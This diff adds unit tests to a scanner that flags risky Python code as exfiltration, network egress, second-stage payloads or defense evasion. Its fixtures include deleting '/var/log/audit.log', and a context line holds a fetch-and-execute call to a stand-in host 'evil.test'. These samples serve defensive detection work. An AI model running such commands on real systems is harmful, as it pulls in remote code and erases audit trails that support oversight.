@@ -46,6 +46,44 @@ describe("Python scanning", () => {
     expect(result.findings.some((finding) => finding.category === "privilege_escalation")).toBe(false);
   });
 
+  it("binds S3Transfer uploads as network and exfiltration sinks", () => {
+    const result = scanPython(`
+      from s3transfer import S3Transfer
+      transfer = S3Transfer(s3_client)
+      transfer.upload_file(temporary_zipfile, bucket, key)
+    `);
+    expect(result.findings).toEqual(expect.arrayContaining([
+      expect.objectContaining({
+        ruleId: "python.network",
+        category: "network_egress",
+      }),
+      expect.objectContaining({
+        ruleId: "python.exfiltration",
+        category: "data_exfiltration",
+      }),
+    ]));
+    expect(scanPython("helper.upload_file(path, bucket, key)").findings
+      .some((finding) => finding.category === "network_egress")).toBe(false);
+  });
+
+  it("distinguishes temporary cleanup and archive creation from destructive or second-stage behavior", () => {
+    const benign = scanPython(`
+      import os
+      import zipfile
+      zip_file = zipfile.ZipFile(output, 'w', zipfile.ZIP_DEFLATED)
+      os.remove(temporary_zipfile)
+    `);
+    expect(benign.findings.some((finding) =>
+      finding.category === "destructive_behavior"
+      || finding.category === "second_stage_payload"
+    )).toBe(false);
+
+    expect(scanPython("zipfile.ZipFile(downloaded_archive, 'r')")
+      .findings.some((finding) => finding.category === "second_stage_payload")).toBe(true);
+    expect(scanPython("os.remove('/var/log/audit.log')")
+      .findings.some((finding) => finding.category === "defense_evasion")).toBe(true);
+  });
+
   it("does not scan dangerous-looking text inside an unrelated call", () => {
     const result = scanPython(`print("exec(requests.get('https://evil.test').text)")`);
     expect(result.findings).toHaveLength(0);
